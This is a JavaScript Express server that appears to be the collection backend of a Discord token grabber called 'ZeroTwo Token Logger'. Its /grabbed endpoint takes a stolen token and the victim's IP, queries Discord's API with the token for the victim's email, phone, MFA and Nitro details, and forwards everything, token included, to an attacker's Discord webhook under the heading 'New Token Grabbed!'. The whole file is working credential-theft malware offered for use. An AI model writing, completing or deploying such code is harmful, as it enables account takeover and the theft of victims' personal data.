const app = require('express')()

const request = require('request')

const Discord = require('v11-discord.js');

const webhook = "PUT WEBHOOK URL HERE";

app.get("/grabbed", async (req, res) => {
    var token = req.headers.token
    var ip = req.headers.ip
    if (token) {
        request(
            "https://discordapp.com/api/v8/users/@me", {
                method: "GET",
                headers: {
                    authorization: token.slice(1, -1)
                },
                json: true
            },
            function (error, response, body) {
                if (response.statusCode === 200) {

                    if (body["premium_type"] < 0) var nitro = "𝗡𝗼 𝗡𝗶𝘁𝗿𝗼"
                    else var nitro = "𝗡𝗶𝘁𝗿𝗼 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲𝗱 !"
                    if (body.bio) var bio = body.bio
                    else var bio = "𝗡𝗼 𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝘆"
                    if (body.banner) var image = `https://cdn.discordapp.com/banners/${body.id}/${body.banner}.png?size=512`
                    else var image = "https://www.icegif.com/wp-content/uploads/icegif-219.gif"
                    var webh = webhook.split('/')
                    const web = new Discord.WebhookClient(webh[5], webh[6])
                    const embed = new Discord.RichEmbed()
                        .setTitle("𝗡𝗲𝘄 𝗧𝗼𝗸𝗲𝗻 𝗚𝗿𝗮𝗯𝗯𝗲𝗱 !")
                        .setURL("https://github.com/GayarraFrost/DiscordTokenGrabber")
                        .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", `${body.username}#${body.discriminator}`, true)
                        .addField("𝗜𝗗", body.id, true)
                        .addField("𝗣𝘂𝗯𝗹𝗶𝗰 𝗙𝗹𝗮𝗴𝘀", body["public_flags"], true)
                        .addField("𝗙𝗹𝗮𝗴𝘀", body.flags, true)
                        .addField("𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲𝗱 𝗙𝗹𝗮𝗴𝘀", body["purchased_flags"], true)
                        .addField("𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗨𝘀𝗮𝗴𝗲 𝗙𝗟𝗔𝗚𝗦", body["premium_usage_flags"], true)
                        .addField("𝗕𝗮𝗻𝗻𝗲𝗿 𝗖𝗼𝗹𝗼𝗿", body["banner_color"], true)
                        .addField("𝗔𝗰𝗰𝗲𝗻𝘁 𝗖𝗼𝗹𝗼𝗿", body["accent_color"], true)
                        .addField("𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝗶𝗲", bio, true)
                        .addField("𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲", body.locale, true)
                        .addField("𝗡𝗦𝗙𝗪 𝗔𝗹𝗹𝗼𝘄𝗲𝗱 ?", body["nsfw_allowed"], true)
                        .addField("𝗗𝗼𝘂𝗯𝗹𝗲 𝗔𝘂𝘁𝗵 ?", body["mfa_enabled"], true)
                        .addField("𝗡𝗶𝘁𝗿𝗼 ?", nitro, true)
                        .addField("𝗘𝗺𝗮𝗶𝗹", body.email, true)
                        .addField("𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 ?", body.verified, true)
                        .addField("𝗣𝗵𝗼𝗻𝗲 ?", body.phone, true)
                        .addField("𝗧𝗼𝗸𝗲𝗻", `||${token}||`)
                        .addField("𝐈𝐏 𝐀𝐃𝐃𝐑𝐄𝐒𝐒", `||${ip}||`, true)
                        .setThumbnail(`https://cdn.discordapp.com/avatars/${body.id}/${body.avatar}.gif?size=128`)
                        .setImage(image)
                        .setColor("#00aaaa")
                        .setFooter("𝗭𝗲𝗿𝗼𝗧𝘄𝗼 𝗧𝗼𝗸𝗲𝗻 𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 𝗡𝗼𝘁.𝗙𝘂𝗯𝘂𝗸𝗶𝗶", "http://image.noelshack.com/fichiers/2021/35/4/1630603625-a-67d7f1132cb32d9f903d69da5b880524.gif")
                    web.send(embed)
                }
            })
    } else {
        res.sendStatus(404)
        console.log("Quelqu'un a surment trouver votre API Token Grabber !\nSomeone Found Your Token GRabber API !")
    }
})

app.listen(3000)
